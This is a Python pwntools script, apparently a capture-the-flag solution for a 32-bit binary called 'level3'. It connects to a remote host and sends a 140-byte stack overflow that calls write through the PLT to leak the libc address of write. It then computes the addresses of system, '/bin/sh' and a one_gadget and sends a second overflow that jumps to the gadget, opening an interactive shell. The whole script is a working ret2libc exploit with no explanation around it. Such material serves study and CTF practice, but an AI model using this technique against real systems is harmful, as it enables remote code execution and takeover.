
from pwn import *
from leak_to_address import *

context.terminal = ['gnome-terminal', '-e']

elf = ELF('./level3')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('./libc_32.so.6')

r = remote('111.198.29.45', 35316)
# r = process('./level3')

r.recvuntil('Input:\n')

write_got = elf.got[b'write']
write_plt = elf.plt[b'write']
vuln = elf.symbols[b'vulnerable_function']

write_off = libc.sym[b'write']
binsh_off = next(libc.search(b'/bin/sh'))
system_off = libc.sym[b'system']

p = b'A' * 140
p += p32(write_plt)
p += p32(vuln)
p += p32(0x1)
p += p32(write_got)
p += p32(0x4)

r.sendline(p)

s = r.recvuntil('\n')

l = Leak_address(s, 32)
# print(l.print_leak())

libc_addr = l.leak_to_32_int(0) - write_off
binsh = libc_addr + binsh_off
system = libc_addr + system_off
one_gadget = 0x3a80c + libc_addr

log.info('Libc_addr   : ' + hex(libc_addr))
log.info('System_addr : ' + hex(system))
log.info('Binsh_addr  : ' + hex(binsh))
log.info('One_gadget  : ' + hex(one_gadget))

p = b'A' * 140
p += p32(one_gadget)

# System + '/bin/sh'

# p += p32(system)
# p += p32(0xAAAAAAAA)
# p += p32(binsh)

r.sendline(p)
# gdb.attach(r)
r.interactive()
